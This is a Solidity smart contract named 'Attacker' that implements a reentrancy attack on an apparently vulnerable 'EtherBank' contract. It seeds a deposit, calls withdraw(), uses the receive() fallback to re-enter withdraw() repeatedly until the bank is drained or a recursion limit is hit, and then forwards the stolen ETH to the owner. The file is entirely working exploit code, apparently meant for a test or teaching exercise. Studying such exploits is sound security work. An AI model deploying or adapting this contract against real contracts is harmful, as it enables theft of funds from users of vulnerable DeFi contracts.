// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "@openzeppelin/contracts/utils/Address.sol";

interface IEtherBank {
    function deposit() external payable;
    function withdraw() external;
}

error NotOwner();

contract Attacker {
    using Address for address payable;

    IEtherBank public immutable etherBank;
    address payable private immutable owner;
    uint8 private counter;
    uint8 private immutable maxRecursions;

    event AttackStarted(address indexed attacker, uint256 value);
    event Reentered(uint8 round, uint256 bankBalance);
    event Payout(address indexed to, uint256 amount);

    constructor(address etherBankAddress, uint8 _maxRecursions) {
        etherBank = IEtherBank(etherBankAddress);
        owner = payable(msg.sender);
        maxRecursions = _maxRecursions == 0 ? 1 : _maxRecursions; // at least 1
    }

    modifier onlyOwner() {
        if (msg.sender != owner) revert NotOwner();
        _;
    }

    //Start attack: deposit `msg.value` to the victim then call withdraw
    function attack() external payable onlyOwner {
        require(msg.value > 0, "Send ETH to seed attack");
        emit AttackStarted(msg.sender, msg.value);
        etherBank.deposit{value: msg.value}();
        etherBank.withdraw();
    }

    // Fallback that tries to reenter while respecting maxRecursions
    receive() external payable {
        uint256 bankBal = address(etherBank).balance;
        // If there is still value in bank and we haven't hit max recursion, reenter
        if (bankBal > 0 && counter < maxRecursions) {
            unchecked { counter++; } // small gas saving, counter bounded
            emit Reentered(counter, bankBal);
            // Attempt to reenter withdraw() on victim
            etherBank.withdraw();
            return;
        }

        // Finished (either bank drained or recursion limit reached)
        // reset counter and forward funds to owner
        counter = 0;
        uint256 payout = address(this).balance;
        if (payout > 0) {
            payable(owner).sendValue(payout);
            emit Payout(owner, payout);
        }
    }

    // Allow reading attacker's contract balance (for tests)
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
